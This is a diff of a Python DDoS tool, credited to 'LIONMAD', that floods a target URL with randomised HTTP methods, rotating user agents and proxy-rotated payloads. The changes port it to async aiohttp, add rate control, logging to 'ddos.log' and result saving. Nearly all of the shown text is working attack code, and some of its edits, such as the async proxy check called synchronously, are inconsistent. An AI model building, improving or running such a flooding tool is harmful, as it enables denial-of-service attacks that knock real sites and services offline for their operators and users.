@@ -1,28 +1,28 @@
 #!/usr/bin/env python3
 # Coded by LIONMAD
-import requests
+import aiohttp
+import asyncio
 import time
 import argparse
 import threading
 import random
 import json
+import logging
 from colorama import init, Fore, Style
 from dns import resolver
 from base64 import b64encode
 from itertools import cycle
-from cloudscraper import create_scraper
-import os
-import subprocess
-from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import deque
 from uuid import uuid4
 import signal
 import sys
-import socket
+import os
+import subprocess
 import hashlib
 import zlib
 import hmac
+from tqdm import tqdm
 
 # Initialize colorama
 init(autoreset=True)
@@ -48,6 +48,16 @@ USER_AGENTS = [
 ]
 
 HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
+
+# Logging setup
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('ddos.log'),
+        logging.StreamHandler()
+    ]
+)
 
 # Functions
 def display_banner():
@@ -84,15 +94,16 @@ def validate_proxies(proxies):
                 if future.result():
                     validated_proxies.append(proxy)
             except Exception as e:
-                print(f"Proxy validation failed for {proxy}: {e}")
+                logging.error(f"Proxy validation failed for {proxy}: {e}")
     print(f"Validated {len(validated_proxies)} proxies.")
     return validated_proxies
 
-def check_proxy(proxy: str):
+async def check_proxy(proxy: str):
     try:
-        response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
-        return response.status_code == 200
-    except requests.RequestException:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
+                return response.status == 200
+    except Exception:
         return False
 
 def resolve_target(target_url: str):
@@ -102,7 +113,7 @@ def resolve_target(target_url: str):
         print(f"Resolved {domain} to IP: {ip}")
         return ip
     except Exception as e:
-        print(f"Failed to resolve domain: {e}")
+        logging.error(f"Failed to resolve domain: {e}")
         return None
 
 def check_target_reachable(ip: str):
@@ -110,7 +121,7 @@ def check_target_reachable(ip: str):
         result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
         return result.returncode == 0
     except Exception as e:
-        print(f"Ping check failed: {e}")
+        logging.error(f"Ping check failed: {e}")
         return False
 
 def generate_payload(payload_type: str):
@@ -143,59 +154,68 @@ def generate_hmac_signature(payload: str, key: str):
     """Generate HMAC signature for the payload."""
     return hmac.new(key.encode(), payload.encode(), hashlib.sha256).hexdigest()
 
-def attack(target_url: str, stop_event: threading.Event, pause_time: float, proxies=None, headers=None, payload_type="json"):
+async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json"):
     global requests_sent, successful_requests, failed_requests, last_time
-    scraper = create_scraper()
     proxy_pool = cycle(proxies) if proxies else None
+    semaphore = asyncio.Semaphore(rate_limit)
 
-    while not stop_event.is_set():
-        try:
-            headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
-            method = random.choice(HTTP_METHODS)
-            payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
+    async with aiohttp.ClientSession() as session:
+        while not stop_event.is_set():
+            async with semaphore:
+                try:
+                    headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
+                    method = random.choice(HTTP_METHODS)
+                    payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
 
-            proxy = {"http": next(proxy_pool), "https": next(proxy_pool)} if proxy_pool else None
+                    proxy = next(proxy_pool) if proxy_pool else None
+                    async with session.request(
+                        method, target_url, headers=headers, proxy=proxy, data=payload
+                    ) as response:
+                        with requests_lock:
+                            requests_sent += 1
+                            if response.status in [200, 201, 204]:
+                                successful_requests += 1
+                            else:
+                                failed_requests += 1
+                except aiohttp.ClientError as e:
+                    with requests_lock:
+                        failed_requests += 1
+                    logging.error(f"Client error during request: {e}")
+                except Exception as e:
+                    with requests_lock:
+                        failed_requests += 1
+                    logging.error(f"Unexpected error during request: {e}")
 
-            response = scraper.request(
-                method, target_url, headers=headers, proxies=proxy, timeout=5, data=payload
-            )
-
-            with requests_lock:
-                requests_sent += 1
-                last_time = time.time()
-                if response.status_code in [200, 201, 204]:
-                    successful_requests += 1
-                else:
-                    failed_requests += 1
-
-        except requests.RequestException as e:
-            with requests_lock:
-                failed_requests += 1
-            print(f"Request failed: {e}")
-
-        time.sleep(pause_time)
+                await asyncio.sleep(pause_time)
 
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
     start_time = time.time()
     results = []
-    while not stop_event.is_set():
-        elapsed = time.time() - start_time
-        if elapsed >= duration:
-            break
-        with requests_lock:
-            current_time = time.time()
-            rps = requests_sent / max(1, current_time - start_time)
-            rps_history.append(rps)
-            stats = {
-                "Time": elapsed,
-                "Requests Sent": requests_sent,
-                "Successful Requests": successful_requests,
-                "Failed Requests": failed_requests,
-                "RPS": rps,
-            }
-            results.append(stats)
-            print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}")
-        time.sleep(1)
+    with tqdm(total=duration, desc="Progress") as pbar:
+        while not stop_event.is_set():
+            elapsed = time.time() - start_time
+            if elapsed >= duration:
+                break
+            with requests_lock:
+                current_time = time.time()
+                rps = requests_sent / max(1, current_time - start_time)
+                rps_history.append(rps)
+                stats = {
+                    "Time": elapsed,
+                    "Requests Sent": requests_sent,
+                    "Successful Requests": successful_requests,
+                    "Failed Requests": failed_requests,
+                    "RPS": rps,
+                }
+                results.append(stats)
+                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}")
+            pbar.update(1)
+            time.sleep(1)
+
+    if results_file:
+        with open(results_file, "w") as f:
+            json.dump(results, f, indent=4)
+        print(f"Results saved to {results_file}")
 
 def calculate_rps_stats():
     if not rps_history:
@@ -219,13 +239,14 @@ def parse_args():
     parser.add_argument("--proxies", help="File containing proxy list")
     parser.add_argument("--headers", help="Custom headers as JSON string")
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
-    parser.add_argument("--results", help="File to save results (CSV)")
+    parser.add_argument("--results", help="File to save results (JSON)")
+    parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
     return parser.parse_args()
 
-def main():
+async def main():
     args = parse_args()
 
-    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0:
+    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
         print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
         exit(1)
 
@@ -244,16 +265,11 @@ def main():
         exit(1)
 
     stop_event = threading.Event()
-    threads = []
+    tasks = []
 
     for _ in range(args.threads):
-        t = threading.Thread(
-            target=attack,
-            args=(args.url, stop_event, args.pause, proxies, headers, args.payload),
-        )
-        t.daemon = True
-        threads.append(t)
-        t.start()
+        task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload))
+        tasks.append(task)
 
     display_thread = threading.Thread(
         target=display_status, args=(stop_event, args.duration, args.results)
@@ -264,18 +280,16 @@ def main():
     signal.signal(signal.SIGINT, signal_handler)
 
     try:
-        time.sleep(args.duration)
+        await asyncio.sleep(args.duration)
     except KeyboardInterrupt:
         print(f"{RED}Interrupted by user.{RESET}")
     finally:
         stop_event.set()
-
-    for t in threads:
-        t.join()
+        await asyncio.gather(*tasks)
 
     with requests_lock:
         rps_stats = calculate_rps_stats()
         print(f"{GREEN}Test completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps_stats['avg']:.2f}{RESET}")
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
